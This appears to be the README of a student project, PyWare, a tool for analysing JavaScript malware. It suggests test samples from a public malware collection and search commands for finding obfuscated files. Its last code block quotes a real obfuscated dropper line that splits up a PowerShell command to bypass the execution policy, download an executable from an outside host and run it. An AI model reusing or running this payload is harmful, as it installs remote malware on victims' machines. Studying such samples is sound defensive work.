# aau-security
Web application security project

## PyWare

Tool for analyzing JavaScript malware

To test the tool it is suggested to look at [HynekPetrak/javascript-malware-collection](https://github.com/HynekPetrak/javascript-malware-collection)

### Potential good files to test

* `20170122_38f3734379c19b7bfbb48e9f6ed4ca84.js`
* `20170118_e2e16d7c80ecd56b18d8b159cfda06bf.js`
* `20170323_05a3cc924d4c8c0699f8d72342482e51.js`

We have ~40GiB JavaScript malware, spread in 39480 files selecting good files for debugging and testing can be challenging, the following command is a nice start.

```
ag \"\ "\+"\ \"
```

It tries to find string concatenations and it uses [ag](https://github.com/ggreer/the_silver_searcher).

To find and cat the files from the list use

```
find -name "*20170122_38f3734379c19b7bfbb48e9f6ed4ca84.js" -exec cat {} +
```

Another satisfying command to try is

```
ag \"\;"\n"
```


This patterns seems common, where meaning full strings are breaked by some kind of variable

```
var aznecad = "cmd.exe /c " + amgizann + "  $hemip='^emp+''\ebbydlu.';$ylqilgi='^wnloadFile(''ht';$pequ='^tp://seehasena';$yxfefb='^Scope    Process;';$yhoz='^olicy    Bypass -';$ryhu='^$path); Start-';$yqyv='^exe'');(New-Obj';$vilwidt='^s/outloo.exe'',';$jiwa='^Set-ExecutionP';$wxagyz='^chter.de/Style';$obsesu='^Process $path';$kwezcof='^ect   System.Net';$anezsy='^.Webclient).Do';$iculci='^ $path=($env:t'; Invoke-Expression ($jiwa+$yhoz+$yxfefb+$iculci+$hemip+$yqyv+$kwezcof+$anezsy+$ylqilgi+$pequ+$wxagyz+$vilwidt+$ryhu+$obsesu);\"";
```
